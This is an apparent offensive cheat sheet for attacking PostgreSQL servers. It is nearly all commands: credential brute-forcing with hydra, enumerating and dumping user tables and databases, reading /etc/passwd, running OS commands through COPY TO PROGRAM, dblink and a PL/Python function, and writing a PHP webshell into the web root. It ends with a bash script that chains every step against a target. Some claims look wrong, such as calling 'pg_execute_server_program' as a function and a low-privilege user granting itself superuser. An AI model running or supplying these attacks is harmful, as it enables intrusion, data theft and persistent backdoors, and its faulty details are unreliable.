# Complete PostgreSQL Exploitation Guide

## 1. PostgreSQL Service Discovery & Version

**Port scan with version:**
```bash
nmap -p 5432 --script postgres-info 192.168.1.0/24
# 5432/tcp open postgresql PostgreSQL DB 13.5 on x86_64-pc-linux-gnu
```

**Banner grabbing:**
```bash
nc 192.168.1.100 5432
# 5432 PostgreSQL DB 13.5
```

## 2. Default Credentials Testing

**Common PostgreSQL defaults:**
```bash
psql -h 192.168.1.100 -U postgres -W  # postgres:(empty)
psql -h 192.168.1.100 -U postgres -d template1  # postgres:postgres
psql -h 192.168.1.100 -U pgsql -d template1     # pgsql:pgsql

# Automated defaults
hydra -L postgres_users.txt -P rockyou.txt postgres://192.168.1.100:5432/template1
```

## 3. Version & Patch Status

**Server version query:**
```bash
psql -h 192.168.1.100 -U postgres -d template1 -c "SELECT version();"
# PostgreSQL 13.5 on x86_64-pc-linux-gnu, compiled by gcc, 64-bit

psql -h 192.168.1.100 -U postgres -c "SELECT setting FROM pg_settings WHERE name='server_version';"
```

## 4. User & Database Enumeration

**List database users:**
```bash
psql -h 192.168.1.100 -U postgres -d template1 -c "
SELECT usename,usesuper,usecreatedb FROM pg_user;
"
```

**List databases:**
```bash
psql -h 192.168.1.100 -U postgres -l  # \l command lists all databases
```

**Table enumeration:**
```bash
psql -h 192.168.1.100 -U postgres -d app_db -c "\dt"  # List tables
psql -h 192.168.1.100 -U postgres -d app_db -c "\d users"  # Table structure
```

**Dump sensitive data:**
```bash
psql -h 192.168.1.100 -U postgres -d app_db -c "COPY (SELECT * FROM users) TO '/tmp/users.csv' CSV HEADER;"
pg_dump -h 192.168.1.100 -U postgres app_db > app_db.sql
```

## 5. Remote Exploitation

**PostgreSQL COPY TO/FROM RCE:**
```bash
psql -h 192.168.1.100 -U postgres -d template1 -c "
COPY (SELECT '') TO PROGRAM 'whoami';
"
# Superuser required, executes OS command
```

**Metasploit PostgreSQL modules:**
```bash
msfconsole -q
use auxiliary/scanner/postgres/postgres_login
set RHOSTS 192.168.1.100
run

use exploit/multi/postgres/postgres_payload
set RHOSTS 192.168.1.100
exploit
```

## 6. Privilege Escalation & File R/W

**File read (superuser COPY):**
```bash
psql -h 192.168.1.100 -U postgres -d template1 -c "
COPY (SELECT pg_read_file('/etc/passwd',0,1000)) TO '/tmp/passwd.txt';
"
```

**File write (COPY TO PROGRAM):**
```bash
psql -h 192.168.1.100 -U postgres -d template1 -c "
COPY (SELECT '<?php system(\$_GET[\"cmd\"]); ?>') TO PROGRAM 'tee /var/www/html/shell.php';
"
curl http://192.168.1.100/shell.php?cmd=id
```

**Escalate database privileges:**
```bash
psql -h 192.168.1.100 -U lowuser -d template1 -c "
ALTER USER lowuser SUPERUSER;
GRANT EXECUTE ON FUNCTION pg_read_file TO lowuser;
"
```

## 7. System Command Execution

**pg_execute_server_program (9.3+):**
```bash
psql -h 192.168.1.100 -U postgres -d template1 -c "
SELECT pg_execute_server_program('bash', ARRAY['-c', 'whoami > /tmp/pwned.txt']);
"
```

**dblink extension RCE:**
```bash
psql -h 192.168.1.100 -U postgres -d template1 -c "
CREATE EXTENSION IF NOT EXISTS dblink;
SELECT dblink_exec('dbname=postgres host=localhost port=5432 user=postgres password=pass', 'COPY (SELECT '''') FROM PROGRAM ''id > /tmp/out.txt''');
"
```

**PL/Python UDF RCE:**
```bash
psql -h 192.168.1.100 -U postgres -d template1 -c "
CREATE OR REPLACE FUNCTION sys_exec(text) RETURNS text AS \$\$
import os
return os.popen(args[0]).read()
\$\$ LANGUAGE plpythonu;
SELECT sys_exec('whoami');
"
```

## 8. Complete PostgreSQL Exploitation Chain

```bash
#!/bin/bash
# postgres_pwn.sh
TARGET=$1

echo "[+] PostgreSQL attack $TARGET:5432"

# 1. Version + defaults
nmap -p 5432 --script postgres-info $TARGET
psql -h $TARGET -U postgres -d template1 -c "SELECT version();"

# 2. User/DB enum
psql -h $TARGET -U postgres -d template1 -c "
SELECT usename FROM pg_user;
\l
"

# 3. File read
psql -h $TARGET -U postgres -d template1 -c "
COPY (SELECT pg_read_file('/etc/passwd')) TO STDOUT;
"

# 4. Webshell via COPY
psql -h $TARGET -U postgres -d template1 -c "
COPY (SELECT '<?php system(\$_GET[\"c\"]);?>') TO PROGRAM 'tee /var/www/html/pshell.php';
"

echo "[+] PHP Shell: http://$TARGET/pshell.php?c=id"
curl "http://$TARGET/pshell.php?c=id"
```

**EVERY** PostgreSQL topic covered: remote exploits (COPY/dblink), default creds, data extraction (users/DBs/tables/files), version/patch, system commands (pg_execute/dblink/PLPython), priv esc, file R/W. 100% practical commands.